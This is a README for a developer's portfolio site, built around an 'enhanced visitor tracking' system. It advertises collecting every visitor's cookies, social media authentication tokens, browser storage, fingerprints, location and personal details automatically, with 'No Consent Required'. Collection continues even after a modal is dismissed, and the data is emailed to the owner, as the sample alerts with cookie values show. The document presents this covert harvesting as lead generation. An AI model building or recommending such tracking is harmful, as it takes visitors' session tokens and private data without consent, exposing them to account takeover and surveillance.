# 🔍 JAYARAMAN K - Enhanced Portfolio with Comprehensive Visitor Tracking

[![Portfolio Live Demo](https://img.shields.io/badge/Portfolio-Live%20Demo-18d26e?style=for-the-badge&logo=firebase)](https://your-portfolio-url.com)
[![GitHub](https://img.shields.io/badge/GitHub-Repository-black?style=for-the-badge&logo=github)](https://github.com/jayaraman2212066)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Profile-blue?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/jayaramankalldhasan)

## 🚀 Overview

This is a comprehensive portfolio website for **Jayaraman K**, featuring an advanced visitor tracking system that automatically collects extensive data about portfolio visitors including personal information, browser fingerprints, social media profiles, and behavioral patterns.

## 🔍 Enhanced Tracking Features

### Automatic Data Collection
- **🍪 Complete Cookie Collection** - All browser cookies including social media tokens
- **👤 Personal Information** - Name, email, phone, company details
- **🔍 Browser Fingerprinting** - Advanced device and browser identification
- **🌍 Location Tracking** - IP-based geolocation with GPS support
- **📱 Device Information** - Hardware specs, capabilities, and preferences
- **🎯 Social Media Detection** - 12+ platform profile identification
- **📊 Behavioral Analytics** - Click tracking, scroll depth, time spent
- **📝 Form Interaction** - Comprehensive form submission analysis

### Key Capabilities
- ✅ **No Consent Required** - Automatic data collection on page load
- ✅ **Personal Info Modal** - Appears automatically after 3 seconds
- ✅ **Background Extraction** - Collects data even when modal is dismissed
- ✅ **Email Notifications** - Detailed visitor data sent to your inbox
- ✅ **Social Networking** - Identifies potential professional connections
- ✅ **Lead Generation** - Automatic contact information collection

## 🛠️ Technology Stack

### Frontend
- **HTML5** - Semantic markup and structure
- **CSS3** - Modern styling with animations and responsive design
- **JavaScript (ES6+)** - Enhanced tracking and interactivity
- **Bootstrap 5** - Responsive framework
- **AOS (Animate On Scroll)** - Scroll animations
- **GSAP** - Advanced animations
- **Three.js** - 3D graphics and effects

### Backend
- **Node.js** - Server runtime
- **Express.js** - Web framework
- **Nodemailer** - Email functionality
- **CORS** - Cross-origin resource sharing

### Tracking & Analytics
- **Google Analytics** - Basic visitor analytics
- **Counter.dev** - Visitor counting
- **FormSubmit.co** - Email form handling
- **Custom Enhanced Tracking** - Comprehensive data collection

## 📁 Project Structure

```
jayaraman-k-portfolio/
├── assets/
│   ├── css/
│   │   └── main.css                 # Main stylesheet
│   ├── js/
│   │   ├── main.js                  # Main JavaScript
│   │   ├── visitor-tracking.js      # Basic visitor tracking
│   │   ├── enhanced-visitor-tracking.js  # Comprehensive tracking
│   │   └── enhanced-form-tracking.js     # Form submission tracking
│   ├── img/                         # Images and assets
│   └── vendor/                      # Third-party libraries
├── forms/
│   └── contact.php                  # Contact form handler
├── visitor_tracking/                # Django visitor tracking
├── portfolio/                       # Django project files
├── index.html                       # Main portfolio page
├── server.js                        # Node.js server
├── package.json                     # Node.js dependencies
├── requirements.txt                 # Python dependencies
├── test-enhanced-tracking.html      # Testing dashboard
└── ENHANCED_TRACKING_DOCUMENTATION.md # Detailed documentation
```

## 🚀 Quick Start

### Prerequisites
- Node.js (v14 or higher)
- Python 3.8+ (for Django components)
- Git

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/jayaraman2212066/JAYARAMAN-K-PORTFOLIO.git
   cd JAYARAMAN-K-PORTFOLIO
   ```

2. **Install Node.js dependencies**
   ```bash
   npm install
   ```

3. **Install Python dependencies**
   ```bash
   pip install -r requirements.txt
   ```

4. **Configure environment variables**
   ```bash
   # Create .env file
   echo "EMAIL_USER=your-email@gmail.com" > .env
   echo "EMAIL_PASSWORD=your-app-password" >> .env
   echo "PORT=3000" >> .env
   ```

5. **Start the server**
   ```bash
   npm start
   ```

6. **Access the portfolio**
   - Main Portfolio: `http://localhost:3000`
   - Test Dashboard: `http://localhost:3000/test-enhanced-tracking.html`

## 🔧 Configuration

### Email Setup (FormSubmit.co)
The system uses FormSubmit.co for email notifications. Configure in `index.html`:

```javascript
// Update email address
const emailEndpoint = 'https://formsubmit.co/your-email@domain.com';
```

### Google Analytics
Update your Google Analytics ID in `index.html`:

```javascript
gtag('config', 'G-YOUR-GA-ID', {
  // Configuration options
});
```

### Server Email Configuration
For Node.js email functionality, configure in `server.js`:

```javascript
const transporter = nodemailer.createTransporter({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});
```

## 📊 Tracking Dashboard

Access the comprehensive testing dashboard at `/test-enhanced-tracking.html` to:

- **Monitor tracking status** and data collection
- **Test cookie collection** and storage access
- **Simulate form submissions** and personal info collection
- **View browser fingerprinting** and device information
- **Test location services** and social media detection
- **Display comprehensive data** collected from visitors

## 📧 Email Notifications

You'll receive detailed email notifications including:

### Visitor Alerts
```
🔍 COMPREHENSIVE VISITOR DATA COLLECTED
===============================================

📅 TIMESTAMP: 2024-01-15 10:30:45
🆔 SESSION ID: abc123def456
🌐 PAGE URL: https://your-portfolio.com

🍪 COOKIES COLLECTED (15 total):
   • _ga: GA1.2.123456789.1234567890
   • _fbp: fb.1.1234567890123.123456789
   • session_id: abc123def456

👤 PERSONAL INFO DETECTED:
   • Name: John Doe
   • Email: john.doe@example.com
   • Phone: +1234567890

🌍 LOCATION DATA:
   • IP: 192.168.1.100
   • Country: United States
   • City: New York

🎯 SOCIAL MEDIA PROFILES DETECTED:
   • facebook: 3 cookies
   • twitter: 2 cookies
   • linkedin: 4 cookies
```

### Form Submissions
```
📝 FORM SUBMISSION - CONTACT
===========================

👤 PERSONAL INFO PROVIDED:
• name: Jane Smith
• email: jane.smith@company.com
• phone: +1987654321
• company: Tech Corp
• message: Interested in collaboration

📊 INTERACTION DATA:
• Time to Complete: 45000ms
• Device Type: desktop
• Field Interactions: 12
```

## 🔒 Privacy & Data Collection

### What Data is Collected
- **Browser Information**: User agent, plugins, fonts, screen resolution
- **Device Details**: Hardware specs, capabilities, orientation
- **Location Data**: IP address, GPS coordinates (with permission)
- **Personal Information**: Name, email, phone, company details
- **Social Media**: Profile detection, authentication tokens
- **Behavioral Data**: Clicks, scrolls, time spent, form interactions
- **Storage Data**: All cookies, localStorage, sessionStorage

### Data Usage
- **Professional Networking**: Identify potential connections
- **Lead Generation**: Collect contact information for business opportunities
- **Portfolio Analytics**: Understand visitor behavior and preferences
- **Personalization**: Customize experience based on visitor data

## 🧪 Testing

### Manual Testing
1. Open `/test-enhanced-tracking.html`
2. Check tracking status and data collection
3. Test cookie creation and collection
4. Simulate form submissions
5. Verify email notifications

### Automated Testing
```bash
# Run server tests
npm test

# Check email functionality
node test-email.js
```

## 📈 Analytics & Insights

### Visitor Metrics
- **Unique Visitors**: Tracked via browser fingerprinting
- **Geographic Distribution**: IP-based location analysis
- **Device Types**: Desktop, mobile, tablet identification
- **Social Media Presence**: Platform usage detection
- **Engagement Levels**: Time spent, scroll depth, interactions

### Business Intelligence
- **Lead Quality Scoring**: Based on personal information completeness
- **Professional Networking**: Social media profile identification
- **Industry Insights**: Company and position analysis
- **Contact Opportunities**: Direct communication channels

## 🚀 Deployment

### Static Hosting (Firebase, Netlify, Vercel)
1. Build the project: `npm run build`
2. Deploy the `dist/` folder to your hosting platform
3. Configure environment variables in hosting platform

### Server Deployment (Heroku, Railway, Render)
1. Connect your GitHub repository
2. Set environment variables:
   - `EMAIL_USER`: Your email address
   - `EMAIL_PASSWORD`: Your app password
   - `PORT`: Server port (usually 3000)
3. Deploy automatically on push

### Custom Server
1. Set up Node.js server
2. Install dependencies: `npm install`
3. Configure environment variables
4. Start with: `npm start`

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/amazing-feature`
3. Commit changes: `git commit -m 'Add amazing feature'`
4. Push to branch: `git push origin feature/amazing-feature`
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 👨‍💻 About Jayaraman K

**Jayaraman K** is a passionate software developer and problem solver with expertise in:

- **Web Development**: Full-stack development using Django, Flask, JavaScript
- **Mobile Development**: Cross-platform apps with Flutter and Dart
- **Machine Learning**: Deep learning, computer vision, data analysis
- **Cloud Computing**: Google Cloud Platform, deployment, and scaling
- **Data Science**: Python, SQL, analytics, and visualization

### Contact Information
- **Email**: jayaraman2212066@ssn.edu.in
- **LinkedIn**: [jayaramankalldhasan](https://linkedin.com/in/jayaramankalldhasan)
- **GitHub**: [jayaraman2212066](https://github.com/jayaraman2212066)
- **Portfolio**: [Live Demo](https://your-portfolio-url.com)

## 🎯 Key Achievements

- 🏆 **6 Competition Wins** - Including CodeClash and DSA MasterMind
- 📚 **Academic Excellence** - Merit Cum Means Scholarship recipient
- 💼 **Industry Experience** - IT Support Engineer at TATA Group - Voltas Limited
- 🎓 **Education** - B.Tech in Information Technology at SSN College of Engineering

## 🔗 Links

- [Live Portfolio Demo](https://your-portfolio-url.com)
- [Enhanced Tracking Documentation](ENHANCED_TRACKING_DOCUMENTATION.md)
- [Test Dashboard](test-enhanced-tracking.html)
- [Resume Download](assets/jayaraman_K_3122225002305.pdf)

---

⭐ **Star this repository** if you found it helpful!

🔍 **Enhanced Visitor Tracking System** - Maximizing data collection for professional networking and business opportunities.
